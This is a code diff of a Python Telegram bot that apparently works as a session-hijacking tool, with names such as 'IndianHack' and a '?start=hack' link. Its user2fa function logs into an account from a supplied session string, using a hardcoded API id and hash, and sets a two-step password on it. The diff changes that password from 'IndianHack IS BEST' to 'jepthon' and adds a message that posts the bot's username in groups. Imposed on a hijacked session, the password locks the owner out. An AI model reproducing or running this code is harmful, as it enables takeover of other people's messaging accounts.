@@ -80,7 +80,7 @@ async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     try:
-      await X.edit_2fa('IndianHack IS BEST')
+      await X.edit_2fa('jepthon')
       return True
     except:
       return False
@@ -225,7 +225,7 @@ async def op(event):
   global mm
   if event.is_private == False:
     if Config.TG_BOT_USERNAME is not None:
-
+        await event.send_message(event.chat_id, str(Config.TG_BOT_USERNAME))
         IndianHack = [
         [
           Button.url("اضغط هنا", f"https://t.me/{Bot_Username}?start=hack")
